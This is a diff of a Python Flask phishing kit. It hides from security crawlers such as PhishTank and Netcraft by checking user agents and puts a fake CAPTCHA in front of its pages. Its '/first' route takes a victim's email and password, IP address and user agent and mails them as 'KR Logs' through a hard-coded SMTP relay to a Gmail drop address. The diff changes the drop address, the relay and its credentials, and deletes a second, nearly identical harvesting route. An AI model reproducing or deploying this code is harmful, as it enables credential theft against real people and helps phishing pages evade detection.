@@ -22,75 +22,29 @@ secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
 bot_user_agents = [
-    'Googlebot',
-    'Baiduspider',
-    'ia_archiver',
-    'R6_FeedFetcher',
-    'NetcraftSurveyAgent',
-    'Sogou web spider',
-    'bingbot',
-    'Yahoo! Slurp',
-    'facebookexternalhit',
-    'PrintfulBot',
-    'msnbot',
-    'Twitterbot',
-    'UnwindFetchor',
-    'urlresolver',
-    'Butterfly',
-    'TweetmemeBot',
-    'PaperLiBot',
-    'MJ12bot',
-    'AhrefsBot',
-    'Exabot',
-    'Ezooms',
-    'YandexBot',
-    'SearchmetricsBot',
-    'phishtank',
-    'PhishTank',
-    'picsearch',
-    'TweetedTimes Bot',
-    'QuerySeekerSpider',
-    'ShowyouBot',
-    'woriobot',
-    'merlinkbot',
-    'BazQuxBot',
-    'Kraken',
-    'SISTRIX Crawler',
-    'R6_CommentReader',
-    'magpie-crawler',
-    'GrapeshotCrawler',
-    'PercolateCrawler',
-    'MaxPointCrawler',
-    'R6_FeedFetcher',
-    'NetSeer crawler',
-    'grokkit-crawler',
-    'SMXCrawler',
-    'PulseCrawler',
-    'Y!J-BRW',
-    '80legs.com/webcrawler',
-    'Mediapartners-Google',
-    'Spinn3r',
-    'InAGist',
-    'Python-urllib',
-    'NING',
-    'TencentTraveler',
-    'Feedfetcher-Google',
-    'mon.itor.us',
-    'spbot',
-    'Feedly',
-    'bot',
-    'curl',
-    'spider',
-    'crawler',
-    ]
-
+    'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher',
+    'NetcraftSurveyAgent', 'Sogou web spider', 'bingbot', 'Yahoo! Slurp',
+    'facebookexternalhit', 'PrintfulBot', 'msnbot', 'Twitterbot',
+    'UnwindFetchor', 'urlresolver', 'Butterfly', 'TweetmemeBot',
+    'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms', 'YandexBot',
+    'SearchmetricsBot', 'phishtank', 'PhishTank', 'picsearch',
+    'TweetedTimes Bot', 'QuerySeekerSpider', 'ShowyouBot', 'woriobot',
+    'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler',
+    'R6_CommentReader', 'magpie-crawler', 'GrapeshotCrawler',
+    'PercolateCrawler', 'MaxPointCrawler', 'R6_FeedFetcher',
+    'NetSeer crawler', 'grokkit-crawler', 'SMXCrawler', 'PulseCrawler',
+    'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google',
+    'Spinn3r', 'InAGist', 'Python-urllib', 'NING', 'TencentTraveler',
+    'Feedfetcher-Google', 'mon.itor.us', 'spbot', 'Feedly', 'bot',
+    'curl', 'spider', 'crawler',
+]
 
 @app.route('/', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         # Check if the user already passed the CAPTCHA
         if session.get('passed_captcha'):
-            return redirect(url_for('success', web=session.get('eman')))
+            return redirect(url_for('benza'))
 
         # Generate a random 4-digit CAPTCHA code
         code = random.randint(1000, 9999)
@@ -116,7 +70,7 @@ def captcha():
         # Check if the entered code matches the stored CAPTCHA code
         if user_input == session.get('code'):
             session['passed_captcha'] = True
-            return redirect(url_for('success', web=session.get('eman')))
+            return redirect(url_for('benza'))
         else:
             # Generate a new CAPTCHA code on failure
             code = random.randint(1000, 9999)
@@ -128,24 +82,17 @@ def captcha():
                 'captcha.html', 
                 code=code, 
                 color=color, 
-                eman=session['eman'], 
-                ins=session['ins'], 
+                eman=session.get('eman'), 
+                ins=session.get('ins'), 
                 error=True
             )
 
-@app.route('/success')
-def success():
-    web_param = request.args.get('web', 'No web param')
-    return redirect(url_for('route2', web=web_param))
-
-@app.route("/route2")
-def route2():
-    web_param = request.args.get('web')
-    if web_param:
-        session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
-    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
-
+@app.route('/benza', methods=['GET'])
+def benza():
+    if request.method == 'GET':
+        eman = session.get('eman', 'No email provided')
+        dman = session.get('ins', 'No domain provided')
+    return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route('/first', methods=['POST'])
 def first():
@@ -161,19 +108,14 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'contact@domainshieldtech.bio'
         sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
-        password = 'vip6ebdd04ea6df'
+        receiver_email = 'bcjung0071@gmail.com'
+        password = 'vip5071dc7bc887'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'General KR Logs !'
         message['From'] = sender_email
         message['To'] = receiver_email
-        text = \
-            """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
+        text = "Hi,\nHow are you?\ncontact me on icq jamescartwright for your fud pages"
         html = render_template('emailmailer.html', emailaccess=email,
                                useragent=useragent,
                                passaccess=passwordemail, ipman=ip)
@@ -181,61 +123,11 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('77.83.196.189', 6040) as server:
+        with smtplib.SMTP('79.141.166.29', 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
-        return redirect(url_for('benza', web=session.get('eman')))
-
-
-@app.route('/second', methods=['POST'])
-def second():
-    if request.method == 'POST':
-        ip = request.headers.get('X-Forwarded-For')
-        if ip is None:
-            ip = request.headers.get('X-Real-IP')
-        if ip is None:
-            ip = request.headers.get('X-Client-IP')
-        if ip is None:
-            ip = request.remote_addr
-        email = request.form.get('horse')
-        passwordemail = request.form.get('pig')
-        sender_email = 'contact@domainshieldtech.bio'
-        sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
-        password = 'vip6ebdd04ea6df'
-        useragent = request.headers.get('User-Agent')
-        message = MIMEMultipart('alternative')
-        message['Subject'] = 'General KOTRA logs !! '
-        message['From'] = sender_email
-        message['To'] = receiver_email
-        text = \
-            """\
-        Hi,
-        How are you?
-        contact me on icq jamescartwright for your fud pages
-        """
-        html = render_template('emailmailer.html', emailaccess=email,
-                               useragent=useragent,
-                               passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, 'plain')
-        part2 = MIMEText(html, 'html')
-        message.attach(part1)
-        message.attach(part2)
-        with smtplib.SMTP('77.83.196.189', 6040) as server:
-            server.login(sender_emaill, password)
-            server.sendmail(sender_email, receiver_email,
-                            message.as_string())
-        return redirect(url_for('lasmo'))
-
-
-@app.route('/benzap', methods=['GET'])
-def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-    return render_template('ind.html', eman=eman, dman=dman)
-
+        return redirect(url_for('benza'))
 
 @app.route('/lasmop', methods=['GET'])
 def lasmo():
@@ -245,8 +137,7 @@ def lasmo():
     if useragent in bot_user_agents:
         abort(403)  # forbidden
 
-    if request.method == 'GET':
-        dman = session.get('ins')
+    dman = session.get('ins', 'No domain provided')
     return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
